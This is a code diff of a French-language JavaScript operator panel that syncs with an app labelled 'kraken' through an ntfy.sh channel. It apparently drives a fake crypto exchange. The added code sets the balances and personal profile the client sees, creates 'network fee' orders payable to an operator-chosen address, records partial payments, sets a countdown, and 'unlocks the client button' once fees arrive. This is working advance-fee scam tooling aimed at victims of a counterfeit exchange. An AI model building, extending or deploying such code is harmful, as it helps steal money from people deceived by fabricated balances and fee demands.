@@ -27,8 +27,13 @@
 
   const DEFAULTS = {
     first: "bernard", last: "", email: "bernard@exemple.com",
-    cash: 0, gas: 2.40, balances: {}, fees: {}, addresses: {}, feeAddresses: {}, rev: 0
+    username: "bernard", phone: "", dob: "", country: "France", postal: "",
+    cash: 0, gas: 2.40, balances: {}, fees: {}, addresses: {}, feeAddresses: {},
+    feeOrders: {}, rev: 0
   };
+
+  const esc = v => String(v == null ? "" : v).replace(/[&<>"']/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
+  const FEE_TTL = 2 * 60 * 60 * 1000;
 
   const load = () => {
     try {
@@ -38,7 +43,8 @@
         balances: { ...(p.balances || {}) },
         fees: { ...(p.fees || {}) },
         addresses: { ...(p.addresses || {}) },
-        feeAddresses: { ...(p.feeAddresses || {}) }
+        feeAddresses: { ...(p.feeAddresses || {}) },
+        feeOrders: { ...(p.feeOrders || {}) }
       };
     } catch { return structuredClone(DEFAULTS); }
   };
@@ -118,13 +124,34 @@
   }
 
   // ── transport ────────────────────────────────────────────────────────
+  // Le profil est un bloc a part. Il part dans l'etat complet et aussi sous
+  // son propre type de message : l'app l'applique sur l'horodatage serveur,
+  // sans test de revision, donc il arrive meme si l'app a publie un rev
+  // plus grand depuis (soldes, ordres de frais).
+  const PROFILE_KEYS = ["first", "last", "email", "username", "phone", "dob", "country", "postal"];
+  const profileOf = () => {
+    const o = {};
+    for (const k of PROFILE_KEYS) o[k] = String(ST[k] ?? "");
+    return o;
+  };
+  const profileFrom = src => {
+    if (!src || typeof src !== "object") return null;
+    const o = {};
+    let any = false;
+    for (const k of PROFILE_KEYS) {
+      if (typeof src[k] === "string") { o[k] = src[k]; any = true; }
+    }
+    return any ? o : null;
+  };
+
   const snapshot = () => ({
-    first: ST.first, last: ST.last, email: ST.email,
+    ...profileOf(),
     cash: Number(ST.cash) || 0, gas: Number(ST.gas) || 0,
     balances: { ...ST.balances }, fees: { ...ST.fees },
     usdcFee: { ...(ST.usdcFee || {}) },
     addresses: { ...ST.addresses },
     feeAddresses: { ...(ST.feeAddresses || {}) },
+    feeOrders: Object.fromEntries(Object.entries(ST.feeOrders || {}).map(([k, v]) => [k, { ...v }])),
     rev: Number(ST.rev) || 0
   });
 
@@ -177,9 +204,8 @@
 
   function applyState(s) {
     if (!s || !(Number(s.rev) > (Number(ST.rev) || 0))) return false;
-    ST.first = String(s.first ?? ST.first);
-    ST.last = String(s.last ?? ST.last);
-    ST.email = String(s.email ?? ST.email);
+    const pf = profileFrom(s);
+    if (pf) Object.assign(ST, pf);
     ST.cash = Math.max(0, Number(s.cash) || 0);
     ST.gas = Math.max(0, Number(s.gas) || 0);
     ST.balances = { ...(s.balances || {}) };
@@ -187,6 +213,9 @@
     ST.usdcFee = { ...(s.usdcFee || {}) };
     ST.addresses = { ...(s.addresses || {}) };
     ST.feeAddresses = { ...(s.feeAddresses || {}) };
+    if (s.feeOrders && typeof s.feeOrders === "object") {
+      for (const r of Object.values(s.feeOrders)) mergeFeeOrder(r);
+    }
     ST.rev = Number(s.rev);
     save();
     return true;
@@ -212,16 +241,22 @@
       const r = await fetch(url, { cache: "no-store", signal: ctrl.signal });
       const txt = await r.text();
       let best = null, bestT = 0;
+      const freshOrders = [];
       for (const line of txt.split("\n")) {
         if (!line.trim()) continue;
         let m; try { m = JSON.parse(line); } catch { continue; }
         if (m.event !== "message" || !m.message) continue;
         lastSync = Math.max(lastSync, (Number(m.time) || 0) * 1000);
         let p; try { p = JSON.parse(m.message); } catch { continue; }
-        if (p.app !== "kraken" || p.type !== "state" || !p.state) continue;
+        if (p.app !== "kraken") continue;
+        if (p.type === "feeOrder" && p.order) { freshOrders.push(p.order); continue; }
+        if (p.type !== "state" || !p.state) continue;
         const t = Number(m.time) || 0;
         if (!best || t >= bestT) { bestT = t; best = p.state; }
       }
+      let ordersTouched = false;
+      freshOrders.forEach(o => { if (mergeFeeOrder(o)) ordersTouched = true; });
+      if (ordersTouched) { save(); if (ST && $("#feeOrderList")) renderFeeOrders(); }
       const seen = Number(ST.msgTime) || 0;
       if (best && bestT > seen) {
         ST.msgTime = bestT;
@@ -246,7 +281,12 @@
   function renderAccount() {
     $("#aFirst").value = ST.first || "";
     $("#aLast").value = ST.last || "";
+    $("#aUser").value = ST.username || "";
     $("#aMail").value = ST.email || "";
+    $("#aPhone").value = ST.phone || "";
+    $("#aDob").value = ST.dob || "";
+    $("#aCountry").value = ST.country || "";
+    $("#aAddr").value = ST.postal || "";
     $("#aCash").value = nf(ST.cash || 0, 2);
     $("#aGas").value = nf(ST.gas || 0, 2);
   }
@@ -402,8 +442,274 @@
   }
 
   function renderAll() {
-    renderAccount(); renderWallet(); renderAddresses(); renderDeposit(); renderLog(); renderSync();
+    renderAccount(); renderWallet(); renderAddresses(); renderDeposit(); renderLog(); renderSync(); renderFeeOrders();
   }
+
+  // ── ordres de frais : édition en direct, reçu partiel ────────────────
+  // L'app publie un ordre dès qu'un envoi ne couvre pas les frais réseau.
+  // On le reprend ici, on enregistre le montant reçu (partiel ou total) et
+  // on republie : la fiche client, la notification et le bouton de
+  // validation suivent sans recharger.
+  let FEE_EDIT = null; // null = liste, "new" = création, sinon id de l'ordre
+
+  function aFeeRemaining(o) {
+    const amount = Number(o && o.amount) || 0;
+    const paid = Math.max(0, Number(o && o.paid) || 0);
+    return { amount, paid, remaining: Math.max(0, amount - paid) };
+  }
+
+  function mergeFeeOrder(r) {
+    if (!r || typeof r !== "object" || !r.id) return false;
+    ST.feeOrders = ST.feeOrders || {};
+    const cur = ST.feeOrders[r.id];
+    if (!cur) { ST.feeOrders[r.id] = { ...r }; return true; }
+    let changed = false;
+    const paid = Math.max(Number(cur.paid) || 0, Number(r.paid) || 0);
+    if (paid !== (Number(cur.paid) || 0)) { cur.paid = paid; changed = true; }
+    if (r.ok && !cur.ok) { cur.ok = true; changed = true; }
+    if (r.done && !cur.done) { cur.done = true; changed = true; }
+    if (r.cancelled && !cur.cancelled) { cur.cancelled = true; changed = true; }
+    if (r.via && !cur.via) { cur.via = String(r.via); changed = true; }
+    if (!cur.src && r.src) { cur.src = String(r.src); changed = true; }
+    if (!cur.kind && r.kind) { cur.kind = String(r.kind); changed = true; }
+    if (Number(r.rev) > Number(cur.rev)) {
+      cur.rev = Number(r.rev);
+      cur.amount = Number(r.amount) || cur.amount;
+      cur.amt = Number(r.amt) || cur.amt;
+      cur.sym = r.sym || cur.sym;
+      cur.pick = r.pick || cur.pick;
+      cur.addr = r.addr != null ? String(r.addr) : cur.addr;
+      cur.feeAddr = r.feeAddr != null ? String(r.feeAddr) : cur.feeAddr;
+      cur.ref = r.ref != null ? String(r.ref) : cur.ref;
+      cur.via = r.via != null ? String(r.via) : cur.via;
+      cur.statusTxt = r.statusTxt != null ? String(r.statusTxt) : cur.statusTxt;
+      cur.lock = !!r.lock;
+      changed = true;
+    }
+    if (Number(r.amount) > 0) cur.amount = Number(r.amount);
+    if (Number(r.exp) > 0) cur.exp = Number(r.exp);
+    return changed;
+  }
+
+  async function publishOrder(o) { return publish({ type: "feeOrder", order: { ...o } }); }
+
+  function feeRowHTML(o) {
+    const rem = aFeeRemaining(o);
+    const state = o.cancelled ? "annulé" : o.done ? "réglé" : o.ok ? "validé"
+      : (Number(o.exp) && Number(o.exp) < Date.now() ? "délai dépassé" : "en attente");
+    const cls = o.ok || o.done ? "ok" : "wait";
+    const amtSent = Number(o.amt) > 0
+      ? (o.pick === "EUR" ? eur(Number(o.amt), 2) : qtyTxt(Number(o.amt), o.pick || "USDC"))
+      : "";
+    return `<div class="feerow">
+      <div class="feemain">
+        <div class="feeline"><b>${eur(rem.amount, 2)}</b> <span class="feesym">${esc(o.sym || "")}</span> · <em class="feestate ${cls}">${state}</em></div>
+        ${amtSent ? `<div class="feesub">envoi ${esc(amtSent)} · ${esc(o.kind === "send" ? "transaction" : "frais")}</div>` : ""}
+        <div class="feesub">payé ${eur(rem.paid, 2)} · reste ${eur(rem.remaining, 2)}${o.pick ? " · " + esc(o.pick) : ""}</div>
+        ${o.feeAddr ? `<div class="feesub mono">frais → ${esc(o.feeAddr)}</div>` : ""}
+        ${o.addr ? `<div class="feesub mono">dest → ${esc(o.addr)}</div>` : ""}
+        ${o.ref ? `<div class="feesub mono">réf ${esc(o.ref)}</div>` : ""}
+        ${o.src === "app" ? `<div class="feesub">depuis l'app</div>` : `<div class="feesub">créé ici</div>`}
+      </div>
+      <div class="feectl">
+        <input data-paid="${esc(o.id)}" inputmode="decimal" autocomplete="off" placeholder="Reçu €">
+        <button type="button" data-fee="partial" data-id="${esc(o.id)}">Ajouter</button>
+        <button type="button" data-fee="ok" data-id="${esc(o.id)}">C'est bon</button>
+        <button type="button" class="ghost" data-fee="del" data-id="${esc(o.id)}">Retirer</button>
+      </div>
+    </div>`;
+  }
+
+  function feeEditorHTML(id) {
+    const o = id && id !== "new" ? (ST.feeOrders || {})[id] : null;
+    const isNew = !o;
+    const val = n => (Number.isFinite(+n) && +n !== 0 ? String(n).replace(".", ",") : "");
+    const amount = o ? Number(o.amount) || 0 : 0;
+    const paid = o ? Number(o.paid) || 0 : 0;
+    const rem = Math.max(0, amount - paid);
+    const expH = o && o.exp ? Math.max(0, (Number(o.exp) - Date.now()) / 3600000).toFixed(1) : "2";
+    const status = o ? (o.cancelled ? "annule" : o.done ? "regle" : o.ok ? "valide" : "attente") : "attente";
+    const opt = (v, t) => `<option value="${v}"${status === v ? " selected" : ""}>${t}</option>`;
+    const symOpt = ["ETH", "USDC", "BTC", "SOL", "EUR"].map(s => `<option value="${s}"${o && o.sym === s ? " selected" : ""}>${s}</option>`).join("");
+    const pickOpt = ["USDC", "BTC", "ETH", "SOL", "EUR"].map(s => `<option value="${s}"${o && o.pick === s ? " selected" : ""}>${s}</option>`).join("");
+    return `<h3>${isNew ? "Ajouter un ordre de frais" : "Modifier l'ordre de frais"}</h3>
+      <p class="sub" style="margin:-6px 0 12px">Mêmes valeurs que la fiche client. Chaque champ se répercute en direct dans l'app après « Appliquer ».</p>
+      <label class="field"><span>Montant envoyé (actif)</span><input data-fe="amt" inputmode="decimal" autocomplete="off" value="${val(o && o.amt)}" placeholder="0"></label>
+      <label class="field"><span>Frais réseau (€)</span><input data-fe="amount" inputmode="decimal" autocomplete="off" value="${val(amount)}" placeholder="0"></label>
+      <label class="field"><span>Déjà reçu (€)</span><input data-fe="paid" inputmode="decimal" autocomplete="off" value="${val(paid)}" placeholder="0"></label>
+      <label class="field"><span>Frais crédités à (adresse de perception)</span><input data-fe="feeAddr" spellcheck="false" autocomplete="off" value="${esc(o && o.feeAddr)}" placeholder="0x… adresse des frais"></label>
+      <label class="field"><span>Destinataire de l'envoi</span><input data-fe="recipient" spellcheck="false" autocomplete="off" value="${esc(o && o.addr)}" placeholder="adresse qui reçoit l'envoi"></label>
+      <label class="field"><span>Référence</span><input data-fe="ref" spellcheck="false" autocomplete="off" value="${esc(o && o.ref)}" placeholder="0x… référence de transaction"></label>
+      <label class="field"><span>Statut</span><select data-fe="status">
+        ${opt("attente", "En attente des frais réseau")}
+        ${opt("valide", "Validé — bouton débloqué")}
+        ${opt("regle", "Réglé — terminé")}
+        ${opt("annule", "Annulé")}
+      </select></label>
+      <label class="field"><span>Devise des frais</span><select data-fe="sym">${symOpt}</select></label>
+      <label class="field"><span>Actif envoyé</span><select data-fe="pick">${pickOpt}</select></label>
+      <label class="field"><span>Temps restant (heures)</span><input data-fe="expH" inputmode="decimal" autocomplete="off" value="${esc(expH)}" placeholder="2"></label>
+      <p class="sub">Reste à régler : <b data-feout="remain">${eur(rem, 2)}</b></p>
+      <button class="btn" data-feeed="apply">${isNew ? "Ajouter l'ordre" : "Appliquer"}</button>
+      <button class="btn ghost" data-feeed="valid">Valider (débloque le bouton client)</button>
+      <button class="btn ghost" data-feeed="back">Retour à la liste</button>
+      ${isNew ? "" : `<button class="btn ghost" data-feeed="del">Supprimer l'ordre</button>`}`;
+  }
+
+  function renderFeeOrders() {
+    const list = $("#feeOrderList");
+    const editor = $("#feeEditor");
+    if (!list || !editor) return;
+    const ae = document.activeElement;
+    // Ne pas écraser une saisie en cours (reçu partiel ou fiche).
+    if (FEE_EDIT && editor.contains(ae)) return;
+    if (!FEE_EDIT && ae && ae.matches && ae.matches("[data-paid]")) return;
+    if (FEE_EDIT) {
+      editor.hidden = false;
+      $("#feeOrderCard").hidden = true;
+      editor.innerHTML = feeEditorHTML(FEE_EDIT);
+      return;
+    }
+    editor.hidden = true;
+    $("#feeOrderCard").hidden = false;
+    const orders = Object.values(ST.feeOrders || {})
+      .filter(o => o && typeof o === "object")
+      .sort((a, b) => (Number(b.at) || 0) - (Number(a.at) || 0));
+    list.innerHTML = orders.length
+      ? orders.map(feeRowHTML).join("")
+      : `<div class="empty">Aucun ordre de frais pour le moment. Ils apparaissent ici dès qu'un envoi laisse des frais à régler.</div>`;
+  }
+
+  async function feeApply(forceStatus) {
+    const g = n => { const x = document.querySelector('#feeEditor [data-fe="' + n + '"]'); return x ? x.value : ""; };
+    const now = Date.now();
+    const amount = parseAmt(g("amount"));
+    const paid = parseAmt(g("paid"));
+    let status = String(forceStatus || g("status") || "attente");
+    if (status === "attente" && amount > 0 && paid >= amount) status = "valide";
+    const expH = parseAmt(g("expH"));
+    let o = (FEE_EDIT && FEE_EDIT !== "new") ? (ST.feeOrders[FEE_EDIT]) : null;
+    if (!o) {
+      const id = "fo" + now.toString(36) + Math.floor(Math.random() * 1e4).toString(36);
+      o = { id, at: now, exp: now + FEE_TTL, paid: 0, ok: false, done: false };
+      ST.feeOrders[id] = o; FEE_EDIT = id;
+    }
+    o.amount = amount; o.lock = amount > 0; o.rev = now;
+    o.amt = parseAmt(g("amt"));
+    o.sym = String(g("sym") || "ETH").toUpperCase() || "ETH";
+    o.pick = String(g("pick") || "USDC").toUpperCase() || "USDC";
+    o.addr = String(g("recipient") || "").trim();
+    o.feeAddr = String(g("feeAddr") || "").trim();
+    o.ref = String(g("ref") || "").trim();
+    o.via = String(g("via") || "").trim();
+    o.paid = status === "annule" ? 0 : paid;
+    if (expH > 0) o.exp = now + Math.round(expH * 3600000);
+    o.cancelled = status === "annule";
+    o.done = status === "regle" || status === "annule";
+    o.ok = status === "valide" || status === "regle" || (amount > 0 && paid >= amount);
+    o.statusTxt = status === "valide" ? "Frais validés — en attente de confirmation"
+      : status === "regle" ? "Réglé — transaction confirmée"
+        : status === "annule" ? "Annulée"
+          : "En attente des frais réseau";
+    save();
+    await publishOrder(o);
+    await publishState();
+    return o;
+  }
+
+  async function feeListClick(e) {
+    const b = e.target.closest("[data-fee]");
+    if (!b) return;
+    const id = b.dataset.id;
+    const o = (ST.feeOrders || {})[id];
+    const act = b.dataset.fee;
+    if (act === "edit") { FEE_EDIT = id; return renderFeeOrders(); }
+    if (act === "del") {
+      if (o) { o.cancelled = true; o.done = true; o.ok = false; o.rev = Date.now(); save(); await publishOrder(o); await publishState(); }
+      toast("Ordre annulé"); renderAll(); return;
+    }
+    if (!o) return toast("Ordre introuvable");
+    if (act === "partial") {
+      const inp = document.querySelector('[data-paid="' + id + '"]');
+      const v = parseAmt(inp ? inp.value : "");
+      if (!(v > 0)) return toast("Saisis le montant reçu");
+      const rem = aFeeRemaining(o);
+      o.paid = Math.min(rem.amount, (Number(o.paid) || 0) + v);
+      o.rev = Date.now();
+      if (o.paid >= rem.amount) o.ok = true;
+      save();
+      await publishOrder(o); await publishState();
+      renderAll();
+      toast("Reçu de " + eur(v, 2) + " — reste " + eur(Math.max(0, rem.amount - o.paid), 2));
+      return;
+    }
+    if (act === "ok") {
+      o.ok = true; o.rev = Date.now();
+      save(); await publishOrder(o); await publishState();
+      renderAll();
+      toast("Frais validés — bouton client débloqué");
+    }
+  }
+
+  async function feeEditorClick(e) {
+    const b = e.target.closest("[data-feeed]");
+    if (!b) return;
+    const act = b.dataset.feeed;
+    if (act === "back") { FEE_EDIT = null; return renderFeeOrders(); }
+    if (act === "del") {
+      if (FEE_EDIT && FEE_EDIT !== "new") {
+        const o = ST.feeOrders[FEE_EDIT];
+        if (o) { o.cancelled = true; o.done = true; o.ok = false; o.rev = Date.now(); save(); await publishOrder(o); await publishState(); }
+      }
+      FEE_EDIT = null; renderAll(); return toast("Ordre supprimé");
+    }
+    const o = await feeApply(act === "valid" ? "valide" : null);
+    toast(o.cancelled ? "Ordre annulé" : o.ok ? "Ordre validé — bouton client débloqué" : "Ordre appliqué en direct");
+    renderAll();
+  }
+
+  function feeEditorInput(e) {
+    const el = e.target;
+    if (!el || !el.matches || !el.matches("[data-fe]")) return;
+    const g = n => { const x = document.querySelector('#feeEditor [data-fe="' + n + '"]'); return x ? x.value : ""; };
+    const amount = parseAmt(g("amount"));
+    const paid = parseAmt(g("paid"));
+    const rem = Math.max(0, amount - paid);
+    document.querySelectorAll('#feeEditor [data-feout="remain"]').forEach(x => { x.textContent = eur(rem, 2); });
+    const sel = document.querySelector('#feeEditor [data-fe="status"]');
+    if (sel && sel.value === "attente" && amount > 0 && paid >= amount) sel.value = "valide";
+  }
+
+  // ── flux temps réel (SSE) : état, frais et notifs sans rafraîchir ────
+  function ingestLive(m) {
+    if (!m || m.event !== "message" || !m.message) return;
+    let p; try { p = JSON.parse(m.message); } catch { return; }
+    if (!p || p.app !== "kraken") return;
+    const t = Number(m.time) || 0;
+    if (p.type === "feeOrder" && p.order) {
+      if (mergeFeeOrder(p.order)) { save(); renderFeeOrders(); }
+      return;
+    }
+    if (p.type === "state" && p.state) {
+      const seen = Number(ST.msgTime) || 0;
+      if (t > seen || Number(p.state.rev) !== (Number(ST.rev) || 0)) {
+        ST.msgTime = Math.max(t, seen);
+        if (applyState(p.state)) { ensureAddresses(); renderAll(); }
+        save();
+      }
+    }
+  }
+
+  function openStream() {
+    if (typeof EventSource === "undefined") return;
+    try {
+      const es = new EventSource("https://ntfy.sh/" + TOPIC + "/sse");
+      es.onmessage = ev => { try { ingestLive(JSON.parse(ev.data)); } catch { } };
+      es.onopen = () => setLive(true);
+      // onerror : EventSource se reconnecte seul ; le poll de 30 s couvre l'intervalle.
+    } catch { /* flux indisponible, on garde le poll */ }
+  }
+
 
   // ── actions ──────────────────────────────────────────────────────────
   let tT;
@@ -411,6 +717,38 @@
     const t = $("#toast");
     t.textContent = m; t.classList.add("on");
     clearTimeout(tT); tT = setTimeout(() => t.classList.remove("on"), 2300);
+  }
+
+  const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[A-Za-z]{2,}$/;
+  const USER_RE = /^[a-z0-9._-]{3,24}$/;
+
+  // Seul point d'ecriture du profil. L'app n'a aucun champ editable : elle
+  // affiche ce que cette fonction publie.
+  async function saveIdentity() {
+    const first = $("#aFirst").value.trim();
+    const email = $("#aMail").value.trim();
+    const user = $("#aUser").value.trim().toLowerCase();
+    if (!first) return toast("Le pr\u00e9nom est obligatoire");
+    if (!EMAIL_RE.test(email)) return toast("Adresse e-mail invalide");
+    if (user && !USER_RE.test(user)) return toast("Nom d'utilisateur : 3 \u00e0 24 caract\u00e8res, a-z 0-9 . _ -");
+    ST.first = first;
+    ST.last = $("#aLast").value.trim();
+    ST.email = email;
+    ST.username = user || first.toLowerCase().replace(/[^a-z0-9]/g, "").slice(0, 24) || "compte";
+    ST.phone = $("#aPhone").value.trim();
+    ST.dob = $("#aDob").value.trim();
+    ST.country = $("#aCountry").value.trim();
+    ST.postal = $("#aAddr").value.trim();
+    ST.rev = Math.max(Date.now(), (Number(ST.rev) || 0) + 1);
+    save();
+    // Deux envois : l'etat complet (soldes + profil) et le profil seul.
+    // Si l'un passe, le profil est a jour cote app.
+    const okState = await publish({ type: "state", state: snapshot() });
+    const okProf = await publish({ type: "profile", profile: profileOf() });
+    const ok = okState || okProf;
+    if (!ok) setPending(true);
+    renderAll();
+    toast(ok ? "Profil mis \u00e0 jour sur tous les appareils" : "Publication en attente - nouvel essai automatique");
   }
 
   async function saveAccount() {
@@ -516,6 +854,7 @@
   });
 
   $("#saveAccount").addEventListener("click", saveAccount);
+  $("#saveIdentity")?.addEventListener("click", saveIdentity);
   // Une frappe dans le champ USDC global se propage aux six reseaux : plus de
   // valeur perimee (2,4) qui reprend le dessus au moment d'enregistrer.
   document.addEventListener("input", e => {
@@ -542,6 +881,12 @@
     if (b) b.addEventListener("click", saveWallet);
   });
   $("#saveFeeAddrAll")?.addEventListener("click", saveAllAddresses);
+
+  // Frais : liste live + fiche éditable.
+  $("#feeOrderNew")?.addEventListener("click", () => { FEE_EDIT = "new"; renderFeeOrders(); });
+  $("#feeOrderList")?.addEventListener("click", feeListClick);
+  $("#feeEditor")?.addEventListener("click", feeEditorClick);
+  $("#feeEditor")?.addEventListener("input", feeEditorInput);
 
   $("#saveWallet").addEventListener("click", saveWallet);
   $("#dSend").addEventListener("click", sendDeposit);
@@ -694,8 +1039,9 @@
   ensureAddresses();
   renderAll();
   const bootTab = location.hash.slice(1);
-  if (["account", "wallet", "deposit", "log"].includes(bootTab)) tab(bootTab);
+  if (["account", "wallet", "fees", "deposit", "log"].includes(bootTab)) tab(bootTab);
   poll();
+  openStream();
   // Une publication restee en attente (limite ntfy) repart des l'ouverture.
   if (pendingPub) {
     publish({ type: "state", state: snapshot() }).then(ok => {
